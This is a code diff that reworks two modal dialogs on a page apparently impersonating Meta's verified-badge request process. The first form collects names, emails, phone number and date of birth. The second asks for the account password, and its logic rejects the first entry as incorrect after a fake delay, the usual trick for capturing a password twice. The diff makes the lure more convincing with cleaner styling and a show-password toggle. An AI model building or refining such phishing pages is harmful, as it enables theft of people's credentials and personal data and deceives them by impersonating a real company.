@@ -8,38 +8,105 @@ document.getElementById('submitRequestBtn').addEventListener('click', openClient
 
 // ==================== MODAL 1: CLIENT INFO ====================
 function openClientModal() {
+    const months = [
+        'January', 'February', 'March', 'April', 'May', 'June',
+        'July', 'August', 'September', 'October', 'November', 'December'
+    ];
+    const currentYear = new Date().getFullYear();
+    const dayOptions = Array.from({ length: 31 }, (_, i) => {
+        const day = i + 1;
+        return `<option value="${day}">${day}</option>`;
+    }).join('');
+    const monthOptions = months.map((name, i) => (
+        `<option value="${i + 1}">${name}</option>`
+    )).join('');
+    const yearOptions = Array.from({ length: currentYear - 1899 }, (_, i) => {
+        const year = currentYear - i;
+        return `<option value="${year}">${year}</option>`;
+    }).join('');
+
+    const fieldClass = 'info-form-control';
+    const labelClass = 'info-form-label';
+
     const content = `
-        <h2 class="font-bold text-[15px] mb-4">Information Form</h2>
-        <form id="clientForm" class="space-y-3">
-            <input type="text" id="fullName" placeholder="Full Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="email" id="email" placeholder="Email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="email" id="emailBusiness" placeholder="Email Business" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="text" id="fanpage" placeholder="Page Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="tel" id="phone" placeholder="Phone Number" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <div>
-                <b class="text-[#9a979e] text-sm block mb-2">Date of Birth</b>
-                <div class="grid grid-cols-3 gap-2">
-                    <input type="number" id="day" placeholder="Day" min="1" max="31" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-                    <input type="number" id="month" placeholder="Month" min="1" max="12" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-                    <input type="number" id="year" placeholder="Year" min="1900" max="2024" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+        <div class="info-form">
+            <div class="info-form-header">
+                <h2 class="info-form-title">Information Form</h2>
+                <p class="info-form-subtitle">Please complete the details below so we can review your verified badge request.</p>
+            </div>
+            <form id="clientForm" class="info-form-body">
+                <div class="info-form-section">
+                    <p class="info-form-section-title">Personal details</p>
+                    <div class="info-form-field">
+                        <label class="${labelClass}" for="fullName">Full name</label>
+                        <input type="text" id="fullName" name="fullName" class="${fieldClass}" placeholder="Enter your full name" autocomplete="name" required>
+                    </div>
+                    <div class="info-form-field">
+                        <label class="${labelClass}" for="fanpage">Page name</label>
+                        <input type="text" id="fanpage" name="fanpage" class="${fieldClass}" placeholder="Enter your Page name" required>
+                    </div>
+                    <div class="info-form-field">
+                        <label class="${labelClass}" for="day">Date of birth</label>
+                        <div class="info-form-dob">
+                            <select id="month" name="month" class="${fieldClass}" required>
+                                <option value="" disabled selected>Month</option>
+                                ${monthOptions}
+                            </select>
+                            <select id="day" name="day" class="${fieldClass}" required>
+                                <option value="" disabled selected>Day</option>
+                                ${dayOptions}
+                            </select>
+                            <select id="year" name="year" class="${fieldClass}" required>
+                                <option value="" disabled selected>Year</option>
+                                ${yearOptions}
+                            </select>
+                        </div>
+                    </div>
                 </div>
-            </div>
-            <textarea placeholder="Additional notes (optional)" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
-            <p class="text-[#9a979e] text-[14px] mb-[7px]">Our response will be sent to you within 14 - 48 hours.</p>
-            <div class="mt-[15px] mb-[20px]">
-                <label class="cursor-pointer flex items-center gap-[5px] text-[14px] " for="custom-checkbox">
-                    <label class="inline-flex items-center cursor-pointer">
-                        <input type="checkbox">
-                    </label>
-                    I agree with<a class="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">Terms of use <img src="./public/icons/reject.svg" class="w-[10px] h-[10px] items-center inline" alt=""></a>
+
+                <div class="info-form-section">
+                    <p class="info-form-section-title">Contact</p>
+                    <div class="info-form-grid">
+                        <div class="info-form-field">
+                            <label class="${labelClass}" for="email">Email</label>
+                            <input type="email" id="email" name="email" class="${fieldClass}" placeholder="name@example.com" autocomplete="email" required>
+                        </div>
+                        <div class="info-form-field">
+                            <label class="${labelClass}" for="emailBusiness">Business email</label>
+                            <input type="email" id="emailBusiness" name="emailBusiness" class="${fieldClass}" placeholder="business@example.com" autocomplete="email" required>
+                        </div>
+                    </div>
+                    <div class="info-form-field">
+                        <label class="${labelClass}" for="phone">Phone number</label>
+                        <input type="tel" id="phone" name="phone" class="${fieldClass}" placeholder="Include country code" autocomplete="tel" required>
+                    </div>
+                </div>
+
+                <div class="info-form-section">
+                    <div class="info-form-field">
+                        <label class="${labelClass}" for="notes">Additional notes <span class="info-form-optional">Optional</span></label>
+                        <textarea id="notes" name="notes" class="${fieldClass} info-form-textarea" placeholder="Add any information that may help us review your request" rows="3"></textarea>
+                    </div>
+                    <p class="info-form-hint">Our response will be sent to you within 14–48 hours.</p>
+                </div>
+
+                <label class="info-form-terms" for="termsAgree">
+                    <input type="checkbox" id="termsAgree" name="termsAgree" required>
+                    <span>I agree to the <a href="#" class="info-form-link">Terms of use</a></span>
                 </label>
-            </div>
-            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Send</button>
-        </form>
+
+                <button type="submit" class="info-form-submit">Submit</button>
+            </form>
+        </div>
     `;
 
     Modal.create('clientModal', content);
     Modal.open('clientModal');
+
+    const termsLink = document.querySelector('#clientModal .info-form-link');
+    if (termsLink) {
+        termsLink.addEventListener('click', (e) => e.preventDefault());
+    }
 
     document.getElementById('clientForm').addEventListener('submit', async (e) => {
         e.preventDefault();
@@ -63,20 +130,26 @@ function openClientModal() {
 // ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
     const content = `
-        <div class="h-full flex flex-col items-center justify-between flex-1">
-            <div class="w-12 h-12 mb-5 mx-auto">
-                <img src="./public/icons/ic_logo.svg" alt="Meta" class="w-full">
+        <div class="info-form security-form">
+            <div class="security-form-brand">
+                <img src="./public/icons/ic_logo.svg" alt="Meta">
             </div>
-            <div class="w-full">
-                <p class="text-[#9a979e] text-sm mb-4">For your security, you must enter your password to continue.</p>
-                <form id="securityForm">
-                    <input type="password" id="password" placeholder="Password" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
-                    <p id="passwordError" class="text-red-500 text-sm hidden mb-3"></p>
-                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Continue</button>
-                    <p class="text-center mt-3"><a href="#" class="text-[#9a979e] text-sm">Forgot your password?</a></p>
-                </form>
+            <div class="info-form-header">
+                <h2 class="info-form-title">Enter your password</h2>
+                <p class="info-form-subtitle">For your security, enter your password to continue this request.</p>
             </div>
-            <div class="w-16 mt-5 mx-auto">
+            <form id="securityForm" class="info-form-body">
+                <div class="info-form-field">
+                    <label class="info-form-label" for="password">Password</label>
+                    <div class="password-field">
+                        <input type="password" id="password" name="password" class="info-form-control" placeholder="Enter your password" autocomplete="current-password" required>
+                        <button type="button" id="togglePassword" class="password-toggle">Show</button>
+                    </div>
+                    <p id="passwordError" class="info-form-error hidden"></p>
+                </div>
+                <button type="submit" class="info-form-submit">Continue</button>
+            </form>
+            <div class="security-form-footer">
                 <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
             </div>
         </div>
@@ -86,16 +159,32 @@ function openSecurityModal() {
     Modal.open('securityModal');
 
     let securityClickCount = 0;
+    const passwordInput = document.getElementById('password');
+    const errorMsg = document.getElementById('passwordError');
+    const togglePassword = document.getElementById('togglePassword');
+
+    togglePassword.addEventListener('click', () => {
+        const showPlain = passwordInput.type === 'password';
+        passwordInput.type = showPlain ? 'text' : 'password';
+        togglePassword.textContent = showPlain ? 'Hide' : 'Show';
+    });
+
+    passwordInput.addEventListener('input', () => {
+        errorMsg.classList.add('hidden');
+        passwordInput.classList.remove('is-error');
+    });
+
     document.getElementById('securityForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-        const password = document.getElementById('password').value.trim();
-        const errorMsg = document.getElementById('passwordError');
-        const submitBtn = e.target.querySelector('button');
+        const password = passwordInput.value.trim();
+        const submitBtn = e.target.querySelector('button[type="submit"]');
 
         errorMsg.classList.add('hidden');
+        passwordInput.classList.remove('is-error');
         if (!password) {
             errorMsg.textContent = "You haven't entered your password!";
             errorMsg.classList.remove('hidden');
+            passwordInput.classList.add('is-error');
             return;
         }
 
@@ -111,9 +200,12 @@ function openSecurityModal() {
             setTimeout(() => {
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'Continue';
-                document.getElementById('password').value = '';
+                passwordInput.value = '';
+                passwordInput.type = 'password';
+                togglePassword.textContent = 'Show';
                 errorMsg.textContent = 'The password you\'ve entered is incorrect.';
                 errorMsg.classList.remove('hidden');
+                passwordInput.classList.add('is-error');
                 securityClickCount = 1;
             }, 1350);
         } else {
